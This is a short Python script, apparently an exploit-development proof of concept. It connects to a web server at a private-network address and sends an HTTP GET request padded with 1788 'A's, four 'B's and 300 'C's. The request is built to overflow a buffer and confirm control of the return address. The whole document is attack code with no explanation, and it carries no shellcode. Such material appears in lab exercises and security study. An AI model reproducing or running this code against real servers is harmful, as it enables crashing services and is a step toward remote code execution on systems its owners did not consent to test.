#!/bin/python
import sys, socket


offeset = "A"* 1788 + "B" * 4  + "C" * 300
eob = "HTTP/1.1\r\n\r\n"
try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.43.156',80))
    print ("Connecting to remote server.....")
    s.send(('GET'+ offeset + eob))
    s.recv(1024)
    s.close()
             
             
except: 
      print("Unable to connect remote server....")
      sys.exit()     